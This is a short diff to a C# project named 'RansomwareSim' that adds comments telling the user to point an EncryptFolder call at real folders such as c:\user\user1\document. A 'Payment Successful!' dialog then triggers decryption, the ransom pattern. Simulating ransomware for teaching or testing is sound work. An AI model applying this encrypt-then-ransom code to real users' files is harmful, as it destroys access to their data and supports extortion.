@@ -29,6 +29,8 @@ namespace RansomwareSim
             
 
             EncryptionService.EncryptFolder(
+            //enter your own file path
+            //enter your file path so example c:\user\user1\document
                 @"enter common file paths",
                 key
             );
@@ -70,7 +72,9 @@ namespace RansomwareSim
                 {
                     MessageBox.Show("Payment Successful!");
                     EncryptionService.DecryptFolder(
+                    //enter your file path so example c:\user\user1\document\TestFolder\ex.zip.enc
                      @"TestFolder\ex.zip.enc",
+                     //enter your file path so example c:\user\user1\document\TestFolder\ex.zip.enc
                      @"TestFolder\ex",
                      key);
                     this.Close();
